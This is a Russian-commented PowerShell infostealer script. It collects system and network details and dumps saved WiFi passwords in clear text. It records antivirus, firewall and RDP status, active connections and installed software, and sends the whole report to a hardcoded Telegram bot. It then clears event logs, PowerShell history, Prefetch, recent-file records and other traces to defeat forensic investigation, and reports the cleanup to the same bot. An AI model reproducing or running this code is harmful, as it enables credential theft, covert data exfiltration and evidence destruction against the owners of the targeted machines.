# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# === ОЧИСТКА СЛЕДОВ ===
Write-Host "Cleaning traces..."

# 1. Очистка истории RUN (диалог Выполнить)
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ RUN dialog history cleared"
} catch {
    Write-Host "✗ Failed to clear RUN history"
}

# 2. Очистка недавних документов
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Recent documents cleared"
} catch {
    Write-Host "✗ Failed to clear recent documents"
}

# 3. Очистка истории PowerShell
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Clear-History
    Write-Host "✓ PowerShell history cleared"
} catch {
    Write-Host "✗ Failed to clear PowerShell history"
}

# 4. Очистка кэша DNS
try {
    Clear-DnsClientCache
    Write-Host "✓ DNS cache cleared"
} catch {
    Write-Host "✗ Failed to clear DNS cache"
}

# 5. Очистка временных файлов
try {
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Temporary files cleared"
} catch {
    Write-Host "✗ Failed to clear temporary files"
}

# 6. Очистка журналов событий (ключевые логи)
try {
    wevtutil el | ForEach-Object {
        if ($_ -match "PowerShell|Windows PowerShell|Microsoft-Windows-PowerShell|System|Security") {
            try {
                wevtutil cl $_ 2>$null
            } catch {}
        }
    }
    Write-Host "✓ Event logs cleared"
} catch {
    Write-Host "✗ Failed to clear event logs"
}

# 7. Очистка Prefetch (ускорение запуска программ)
try {
    Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Prefetch files cleared"
} catch {
    Write-Host "✗ Failed to clear prefetch files"
}

# 8. Очистка корзины
try {
    Remove-Item "C:\`$Recycle.Bin\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Recycle Bin cleared"
} catch {
    Write-Host "✗ Failed to clear Recycle Bin"
}

# 9. Очистка кэша эскизов
try {
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Thumbnail cache cleared"
} catch {
    Write-Host "✗ Failed to clear thumbnail cache"
}

# 10. Очистка истории проводника
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Explorer typed paths cleared"
} catch {
    Write-Host "✗ Failed to clear explorer typed paths"
}

# 11. Очистка кэша шрифтов
try {
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\FontCache\*" -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Font cache cleared"
} catch {
    Write-Host "✗ Failed to clear font cache"
}

# 12. Очистка файла подкачки при следующей загрузке
try {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "ClearPageFileAtShutdown" -Value 1 -Type DWord -Force
    Write-Host "✓ Page file will be cleared on next shutdown"
} catch {
    Write-Host "✗ Failed to set page file clearing"
}

# 13. Очистка истории поиска Windows
try {
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Windows search history cleared"
} catch {
    Write-Host "✗ Failed to clear Windows search history"
}

# 14. Очистка кэша значков
try {
    Remove-Item "$env:LOCALAPPDATA\IconCache.db" -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Icon cache cleared"
} catch {
    Write-Host "✗ Failed to clear icon cache"
}

# 15. Финализация - перезапуск проводника для применения изменений
try {
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process "explorer.exe"
    Write-Host "✓ Explorer restarted"
} catch {
    Write-Host "✗ Failed to restart explorer"
}

Write-Host "All cleanup operations completed!"
Write-Host "System traces have been successfully removed."

# Отправка подтверждения очистки
$cleanupMsg = "✅ System cleanup completed at $(Get-Date)`n`nCleaned items:`n- RUN dialog history`n- Recent documents`n- PowerShell history`n- DNS cache`n- Temporary files`n- Event logs`n- Prefetch files`n- Recycle Bin`n- Thumbnail cache`n- Explorer history`n- Search history`n- Various caches"

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$cleanupMsg}
